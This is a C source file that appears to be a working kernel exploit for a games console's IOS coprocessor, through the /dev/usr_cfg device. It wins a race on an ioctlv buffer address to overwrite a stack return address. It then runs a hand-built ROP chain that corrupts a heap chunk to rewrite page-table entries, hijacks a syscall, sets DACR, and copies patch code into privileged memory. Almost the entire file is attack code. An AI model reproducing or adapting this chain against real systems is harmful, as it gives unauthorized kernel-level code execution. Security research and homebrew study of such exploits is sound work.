#include "loud.h"
#include "logging.h"
#include "misc.h"

static const uint8_t patchcode[] = {
#include "patchcode.h"
};

#define patchcode_dest 0x051107A0u // don't forget to update the makefile

static_assert(patchcode_dest + sizeof(patchcode) <= 0x05110908, "fit");

extern "C" {
int IOS_Open(const char *path, int mode);
int IOS_Ioctl(int fd, int n, void *in, size_t in_len, void *out, size_t out_len);
int IOS_Ioctlv(int fd, int n, size_t num_in, size_t num_out, struct ioctlv *vecs);
int IOS_Close(int fd);
void OSSupressConsoleOutput(bool, bool, bool); // sic
}

struct usr_cfg_item {
    char name[64];
    int perm;
    int type;
    int status;
    size_t len;
    int x;
};

// just a region that hopefully is available and consistent between runs;
// that way I don't have to keep wearing out the nand
static const uint32_t consistent_phys = 0x51000000;//0x50840000;

__attribute__((unused)) static const uint32_t initial_pivot_gadget
    = 0xE5006C43; // pop {r1-r3}; mov r11, r2; mov sp, r3; bx r1

/*
@ 0xe5069e44:

value[0]=50811874 <- R7
value[4]=3 <- R8
value[8]=1 <- R9
value[c]=e5069f88 <- R10
value[10]=e5069fbc <- R11
value[14]=e5002d14 <- LR (usr_cfg_0x3x_impl_sub calls getter)
---- start stack args to getter
value[18]=0
value[1c]=8
value[20]=50811874
value[24]=e5069fbc
value[28]=e5065ce0
---- end
...
*/

#define ITEM_COUNT 8

struct loud {
    union {
        uint32_t my_buf;
        char _cacheline_my_buf[0x40] __attribute__((aligned(0x40)));
    };
    uint32_t rop_buf[0x400] __attribute__((aligned(0x40)));
    union {
        uint32_t extra;
        char _cacheline_extra[0x40] __attribute__((aligned(0x40)));
    };
    struct ioctlv vecs[1 + ITEM_COUNT];
    struct {
        uint32_t x0;
        uint32_t item_count;
        struct usr_cfg_item items[ITEM_COUNT];
    } buf;
    OSThread thread;
    int stack[0x1000];
    struct atomic_u32 ready;
    volatile uint32_t quit;
    uint32_t iod_tmp[4];
    char vec3_dummy[16];
    // char blah[128] __attribute__((aligned(0x40)));
    char patchcode_buf[sizeof(patchcode)];
};

static const uint32_t initial_overwrite_addr = 0xE5069E58; // on stack

__attribute__((unused)) static const uint32_t initial_overwrite_data[4] = {
    initial_pivot_gadget, // pc (in getter's frame)
    initial_pivot_gadget, // r1 -> pc
    0, // r2 -> r11
    consistent_phys + offsetof(struct loud, rop_buf), // r3 -> sp
};

static uint32_t *reg_ptrs[16];
static uint32_t *cur_ptr;
static uint32_t *extra_ptr;
static void *end_ptr;
static bool rop_fail;

static void
write(uint32_t *p, uint32_t val) {
    // log("write(%p, %x)\n", p, val);
    if (p == NULL || (void *)(p + 1) > end_ptr) {
        log("invalid write(%p, %x)\n", p, val);
        rop_fail = true;
        return;
    }
    *p = val;
}

static uint32_t *
next_word(void) {
    return cur_ptr++;
}

static void
set_prev_reg(int i, uint32_t val) {
    // log("set_prev_reg(%d, %x)\n", i, val);
    write(reg_ptrs[i], val);
    reg_ptrs[i] = NULL;
}

static uint32_t
to_phys(void *addr) {
    uint32_t ret = OSEffectiveToPhysical(addr);
    if (!addr || !ret) {
        log("to_phys: %p=>0\n", addr);
        rop_fail = true;
    }
    return ret;
}

static void
gadget_pop_r4to10_pc(void) {
    set_prev_reg(15, 0xe5001c0c);
    for (int i = 4; i <= 10; i++)
        reg_ptrs[i] = next_word();
    reg_ptrs[15] = next_word();
}

static void
gadget_load_r1_r2_clobber_r0_lr(void) {
    /*
        f378:	e8bd4006 	pop	{r1, r2, lr}
        f37c:	e0030092 	mul	r3, r2, r0
        f380:	e0411003 	sub	r1, r1, r3
        f384:	e12fff1e 	bx	lr
    */
    set_prev_reg(0, 0);
    set_prev_reg(15, 0xe500f378);
    reg_ptrs[1] = next_word();
    reg_ptrs[2] = next_word();
    reg_ptrs[4] = NULL;
    reg_ptrs[15] = next_word();
}

static void
gadget_subs_rx_r0_0_clobber_r0_pop(void) {
    /*
        a260:	e2503000 	subs	r3, r0, #0, 0
        a264:	13a03001 	movne	r3, #1, 0
        a268:	e1a00003 	mov	r0, r3
        a26c:	e8bd8010 	pop	{r4, pc}
    */
    set_prev_reg(15, 0xe500a260);
    reg_ptrs[0] = NULL;
    reg_ptrs[3] = NULL;
    reg_ptrs[4] = next_word();
    reg_ptrs[15] = next_word();
}

static void
gadget_ldmmi_r0_r3_ip_sp_lr_pc(void) {
    /*
        6ad8:	4839f009 	ldmdami	r9!, {r0, r3, ip, sp, lr, pc}
    */
    // *** must have condition codes set first!
    set_prev_reg(9, to_phys(cur_ptr + 5)); // decrement after
    set_prev_reg(15, 0xe5006ad8);
    reg_ptrs[0] = next_word();
    reg_ptrs[3] = next_word();
    reg_ptrs[12] = next_word();
    reg_ptrs[13] = next_word(); // important!
    reg_ptrs[14] = next_word();
    reg_ptrs[15] = next_word();
}

static void
gadget_str_r0_r6_mov_r0_r3_pop(void) {
    /*
        1780:	e5860000 	str	r0, [r6]
        1784:	e1a00003 	mov	r0, r3
        1788:	e8bd8070 	pop	{r4, r5, r6, pc}
    */
    set_prev_reg(15, 0xe5001780);

    reg_ptrs[4] = next_word();
    reg_ptrs[5] = next_word();
    reg_ptrs[6] = next_word();
    reg_ptrs[15] = next_word();
}

static void
gadget_str_r4_x_pop(uint32_t addr) {
    /*
        98e8:	e5854014 	str	r4, [r5, #20]
        98ec:	e8bd80f0 	pop	{r4, r5, r6, r7, pc}
    */
    set_prev_reg(15, 0xe50098e8);
    set_prev_reg(5, addr - 20);
    reg_ptrs[4] = next_word();
    reg_ptrs[5] = next_word();
    reg_ptrs[6] = next_word();
    reg_ptrs[7] = next_word();
    reg_ptrs[15] = next_word();
}

static void
store_const(uint32_t addr, uint32_t val) {
    set_prev_reg(4, val);
    gadget_str_r4_x_pop(addr);
}

static void
gadget_mov_r0_r4_pop_r4_pc(void) {
    /*
        ac50:	e1a00004 	mov	r0, r4
        ac54:	e8bd8010 	pop	{r4, pc}
    */
    set_prev_reg(15, 0xe500ac50);
    reg_ptrs[0] = reg_ptrs[4];
    reg_ptrs[4] = next_word();
    reg_ptrs[15] = next_word();
}

static void
do_call(uint32_t func, bool set_r0, uint32_t r0, uint32_t r1, uint32_t r2, uint32_t r3) {
    if (reg_ptrs[0] == NULL)
        gadget_mov_r0_r4_pop_r4_pc(); // set r0
    set_prev_reg(0, 0x99999999);
    gadget_subs_rx_r0_0_clobber_r0_pop();
    gadget_mov_r0_r4_pop_r4_pc(); // set r0
    gadget_load_r1_r2_clobber_r0_lr();
    set_prev_reg(1, r1);
    set_prev_reg(2, r2);

    gadget_pop_r4to10_pc();
    uint32_t *store_value_p = reg_ptrs[4];
    gadget_str_r4_x_pop(initial_overwrite_addr + 0xc);
    gadget_ldmmi_r0_r3_ip_sp_lr_pc();
    if (set_r0)
        set_prev_reg(0, r0);
    set_prev_reg(3, r3);
    // set_prev_reg(13, to_phys(cur_ptr));
    // set_prev_reg(15, func);
    set_prev_reg(15, func);
    set_prev_reg(14, initial_pivot_gadget);
    set_prev_reg(13, initial_overwrite_addr + 4);

    reg_ptrs[12] = NULL;
    for (size_t i = (set_r0 ? 0 : 1); i < 4; i++)
        reg_ptrs[i] = NULL;

    write(store_value_p, to_phys(cur_ptr));

    reg_ptrs[15] = next_word();
    reg_ptrs[11] = next_word();
    reg_ptrs[13] = next_word();

    set_prev_reg(13, to_phys(cur_ptr));
}

static void
rop_main(void) {
    // from initial_pivot:
    reg_ptrs[15] = next_word();
    reg_ptrs[11] = next_word();
    reg_ptrs[13] = next_word();

    set_prev_reg(13, to_phys(cur_ptr));

    uint32_t heap_addr = 0xE5066060;
    uint32_t overwrite_addr = /*ttbr0*/ 0x081A8000 + 4 * 0xdf4;
    uint32_t fakept_entry = 0x08100000u | 0b11 << 10 | 2;
    if (((overwrite_addr & 0x1f) != 0x10) || (heap_addr & 0x1f)) {
        log("bad alignment (overwrite_addr=%x heap_addr=%x)\n", overwrite_addr,
            heap_addr);
        rop_fail = true;
    }
    uint32_t alloc_size = overwrite_addr - heap_addr - /*align_space*/ 0x10;
    ensure((alloc_size & 0x1f) == 0);
    uint32_t chunk_size = fakept_entry + alloc_size + 0x10 + 0x10;
    if (!(chunk_size > alloc_size + /*align_space*/ 0x10 + 0x10)) {
        log("alloc_size overflows\n");
        rop_fail = true;
    }
    log("alloc_size=%x chunk_size=%x\n", alloc_size, chunk_size);

    gadget_mov_r0_r4_pop_r4_pc(); // set r4
    gadget_mov_r0_r4_pop_r4_pc(); // set r0
    do_call(0xE500D90C, // heap_create syscall
            true, heap_addr, // addr
            0x10, // size
            0, 0); // unused r2,r3
    uint32_t *heap_id_dest_p = reg_ptrs[6];
    reg_ptrs[6] = NULL;
    gadget_str_r0_r6_mov_r0_r3_pop();

    // fake chunk: {magic=any, size, prev=null, next=null}
    // but prev/next are already set thanks to heap_create
    store_const(heap_addr + 4, chunk_size);

    do_call(0xE500D92C, // IOS_Alloc syscall
            false, 0, // heap (set below)
            alloc_size, // size
            0, 0); // unused r2,r3
    write(heap_id_dest_p, to_phys(reg_ptrs[0]));
    reg_ptrs[0] = NULL;

    // set_prev_reg(6, to_phys(extra_ptr));
    // gadget_str_r0_r6_mov_r0_r3_pop();
    // ^ should store 0xe5066080(= heap_addr+0x20) to extra_ptr.

    do_call(0xE500DA84, // flush dcache syscall (doesn't check addresses anyway)
            true, overwrite_addr, 0x20, 0, 0); // unused r2,r3

    // it writes the controlled value at +0x14, so address to use is (0xdf4 + 5) << 20
    // this is syscall 0x81:
    uint32_t store_addr = 0xdf900000
        + (0x0812CD2C - 0x08100000); // syscall 0x81 impl (currently just returns 0)
    store_const(store_addr, 0xe12fff13); // bx r3

    do_call(0xE500DA84, // flush dcache syscall
            true, store_addr, 4, 0, 0); // unused r2,r3

    // we can't invalidate icache but hopefully it's ok

    if (0) {
        // test syscall:
        do_call(0xE500DBFC, // syscall 0x81
                true, 0, 0, 0,
                0x08124618); // mov r0, #-1; bx lr
        set_prev_reg(6, to_phys(extra_ptr));
        gadget_str_r0_r6_mov_r0_r3_pop();
    }

    if (0) {
        do_call(0xE500D81C, // get pid
                true, 0, 0, 0, 0);
        set_prev_reg(6, to_phys(extra_ptr));
        gadget_str_r0_r6_mov_r0_r3_pop();
    }

    if (1) {
        if (0)
            do_call(0xE500DBFC, // syscall 0x81
                    true, 0xffffffff, // DACR
                    0,
                    0x081A4000 + 4 * 0xa, // dacr_by_pid[0xa]
                    0x081239F8); // str r0, [r2]; bx lr

        do_call(0xE500DBFC, // syscall 0x81
                true, 0xffffffff, // DACR
                0, 0,
                0x0812EA10); // set DACR to r0
    }

    if (1) {
        store_const(0x050BC574, 0); // MY_BUF
        do_call(0xE500C580, // memcpy
                true, patchcode_dest, // dst
                consistent_phys + offsetof(struct loud, patchcode_buf), // src
                sizeof(patchcode), // len
                0); // unused r3
        do_call(0xE500DA84, // flush dcache syscall
                true, patchcode_dest, sizeof(patchcode), 0, 0); // unused r2,r3

        do_call(0xE500DBFC, // syscall 0x81
                true, 0, 0, 0,
                0x0812DCF0); // invalidate instruction cache

        store_const(0x05096F48, 1); // global_flags
    }

    // replace original return address:
    store_const(initial_overwrite_addr, 0xe5002d14);

    // flag:
    gadget_mov_r0_r4_pop_r4_pc(); // set r0
    set_prev_reg(0, 0x99999999);
    gadget_subs_rx_r0_0_clobber_r0_pop();

    // pivot back:
    gadget_pop_r4to10_pc();
    gadget_ldmmi_r0_r3_ip_sp_lr_pc();
    set_prev_reg(0, -424242u);
    set_prev_reg(13, initial_overwrite_addr - 8 * 4); // pointing to PC -> pointing to R4
    set_prev_reg(15, 0xE50025F8); // pop {r4-r11, pc}
}

static void
setup_rop(struct loud *l) {
    memclr(l->rop_buf, sizeof(l->rop_buf));
    cur_ptr = l->rop_buf;
    end_ptr = (char *)l->rop_buf + sizeof(l->rop_buf);
    extra_ptr = &l->extra;
    memclr(reg_ptrs, sizeof(reg_ptrs));
    rop_fail = false;
    rop_main();
    if (rop_fail) {
        log("rop_fail\n");
        return;
    }
    log("rop_ok, addr %p size 0x%x\n", l->rop_buf,
        (int)((char *)cur_ptr - (char *)l->rop_buf));
    if (0) {
        for (size_t i = 0; i < cur_ptr - l->rop_buf; i++)
            log("%p: %08x\n", &l->rop_buf[i], l->rop_buf[i]);
        log("--\n");
    }
    DCFlushRange(l->rop_buf, sizeof(l->rop_buf));
    l->extra = 0xeeeeeeee;
    DCFlushRange(&l->extra, sizeof(l->extra));

    memcpy(l->patchcode_buf, patchcode, sizeof(patchcode));
    DCFlushRange(l->patchcode_buf, sizeof(patchcode));
}

static int
loud_thread_func(int _, void *_l) {
    struct loud *l = (struct loud *)_l;
    void *volatile *addr_p = &l->vecs[1].addr;
    size_t volatile *size_p = &l->vecs[1].len;
    void *volatile *addr3_p = &l->vecs[3].addr;
    size_t volatile *size3_p = &l->vecs[3].len;
    void *orig_addr = *addr_p;
    void *orig_addr3 = *addr3_p;
    void *phys = (void *)OSEffectiveToPhysical(orig_addr);
    void *phys3 = (void *)OSEffectiveToPhysical(orig_addr3);
    void *target = (void *)initial_overwrite_addr;
    ensure(phys);
    log("loud_thread_func (core %d) orig=%p phys=%p target=%p\n", OSGetCoreId(),
        orig_addr, phys, target);
    store_release_atomic_u32(&l->ready, 1);
    while (*addr3_p != phys3) {
        if (l->quit)
            goto quit_early;
    }
    *size3_p = 0;
    DCFlushRange((void *)addr3_p, 8);
    while (*addr3_p != NULL) {
        DCInvalidateRange((void *)addr3_p, 8);
        if (l->quit)
            goto quit_early;
    }

    *addr_p = target;
    *size_p = 0;
    DCFlushRange((void *)addr_p, 8);
    log("loud_thread_func: ran\n");
    return 0;
quit_early:
    log("loud_thread_func: quit early\n");
    return 0;
}

static void
ioctlv3x_basics(struct loud *l) {
    memclr(&l->buf, sizeof(l->buf));
    memclr(l->vecs, sizeof(l->vecs));
    l->vecs[0].addr = &l->buf;
    l->vecs[0].len = sizeof(l->buf);
    for (size_t i = 0; i < ITEM_COUNT; i++)
        l->buf.items[0].status = 1234;
    memclr(l->iod_tmp, sizeof(l->iod_tmp));
}

bool
loud(void) {
    bool ret = false;
    log("loud start (core %d)\n", OSGetCoreId());

    int fd = IOS_Open("/dev/usr_cfg", 0);
    log("IOS_Open =>%x \n", fd);
    ensure(fd >= 0);

    enum { alloc_size = 0x1000000 };
    char *alloc = (char *)MEMAllocFromDefaultHeapEx(alloc_size, 0x10000);
    if (!alloc) {
        log("alloc fail\n");
        goto end;
    }
    uint32_t alloc_phys;
    alloc_phys = OSEffectiveToPhysical(alloc);

    log("alloc=%p phys=%x..%x\n", alloc, alloc_phys, alloc_phys + alloc_size);
    size_t alloc_offset;
    alloc_offset = consistent_phys - alloc_phys;
    if (alloc_offset >= alloc_size || alloc_size - alloc_offset < sizeof(struct loud)) {
        log("phys %x not in range\n", consistent_phys);
        goto end;
    }

    struct loud *l;
    l = (struct loud *)(alloc + alloc_offset);

    memclr(l, sizeof(*l));
    DCFlushRange(l, sizeof(*l));

    setup_rop(l);
    if (rop_fail || 0)
        goto end;

    if (0) { // <-- Change to 1 to write current data to NAND, then back to 0 to actually exploit.
        { // delete
            ioctlv3x_basics(l);
            l->buf.item_count = 1;
            stpcpy(l->buf.items[0].name, "asdg");
            int ret = IOS_Ioctlv(fd, 0x32, 1, 0, l->vecs);
            log("delete: ret=%d\n", ret);
            log("status[0]=%d\n", l->buf.items[0].status);
        }
        { // set
            ioctlv3x_basics(l);
            memcpy(l->iod_tmp, initial_overwrite_data, sizeof(initial_overwrite_data));

            l->buf.item_count = 1;
            stpcpy(l->buf.items[0].name, "asdg.qwer");
            l->buf.items[0].perm = 0x777;
            l->buf.items[0].type = 7;
            l->buf.items[0].len = l->vecs[1].len = sizeof(initial_overwrite_data);
            l->vecs[1].addr = l->iod_tmp;
            int ret = IOS_Ioctlv(fd, 0x31, 2, 0, l->vecs);
            log("set: ret=%d\n", ret);
            log("status[0]=%d\n", l->buf.items[0].status);
        }
        goto end;
    }

    { // test get
        ioctlv3x_basics(l);
        l->buf.item_count = 1;
        stpcpy(l->buf.items[0].name, "asdg.qwer");
        l->buf.items[0].type = 7;
        l->buf.items[0].len = l->vecs[1].len = sizeof(initial_overwrite_data);
        l->vecs[1].addr = l->iod_tmp;
        int ret = IOS_Ioctlv(fd, 0x30, 1, 1, l->vecs);
        log("get: ret=%d\n", ret);
        log("status[0]=%d\n", l->buf.items[0].status);
        int cmp
            = memcmp(l->iod_tmp, initial_overwrite_data, sizeof(initial_overwrite_data));
        log("cmp=%d\n", cmp);
        if (cmp)
            goto end;
    }

    for (int i = 0; i < 100; i++) {
        log("race try %d\n", i);
        /*
        memset(l->blah, 0xee, sizeof(l->blah));
        DCFlushRange(l->blah, sizeof(l->blah));
        */
        *extra_ptr = 0x12345678;
        DCFlushRange(extra_ptr, 4);

        ioctlv3x_basics(l);
        l->buf.item_count = ITEM_COUNT;
        stpcpy(l->buf.items[0].name, "asdg.qwer");
        l->buf.items[0].type = 7;
        l->buf.items[0].len = l->vecs[1].len = sizeof(initial_overwrite_data);
        l->vecs[1].addr = l->iod_tmp;

        l->vecs[3].addr = l->vec3_dummy;
        l->vecs[3].len = sizeof(l->vec3_dummy);

        store_release_atomic_u32(&l->ready, 0);
        l->quit = 0;

        ensure(OSCreateThread(&l->thread, (void *)loud_thread_func, 0, l,
                              l->stack + sizeof(l->stack), (int)sizeof(l->stack), 16, 1));

        OSResumeThread(&l->thread);

        while (!load_acquire_atomic_u32(&l->ready))
            ;

        int ret = IOS_Ioctlv(fd, 0x30, 1, ITEM_COUNT, l->vecs);
        log("racing-read: ret=%d\n", ret);
        log("status[0]=%d\n", l->buf.items[0].status);
        l->quit = 1;
        OSJoinThread(&l->thread, NULL);
        log("joined\n");
        DCInvalidateRange(extra_ptr, 4);
        uint32_t extra_val = *extra_ptr;
        log("extra: 0x%x\n", extra_val);

        if (ret == -424242u) {
            log("good!\n");
            break;
        }
    }

    OSSupressConsoleOutput(false, false, false);

    if (0) {
        // test log
        for (uint32_t run = 0;; run++) {
            DCInvalidateRange(&l->my_buf, sizeof(l->my_buf));
            log("my_buf=%x\n", l->my_buf);
            usleep(500000);
            int size
                = snprintf(l->patchcode_buf, sizeof(l->patchcode_buf), "hello %u\n", run);
            __OSConsoleWrite(l->patchcode_buf, (size_t)size);
            usleep(500000);
        }
    }

    ret = true;

end:
    IOS_Close(fd);
    MEMFreeToDefaultHeap(alloc);
    log("out\n");
    return ret;
}
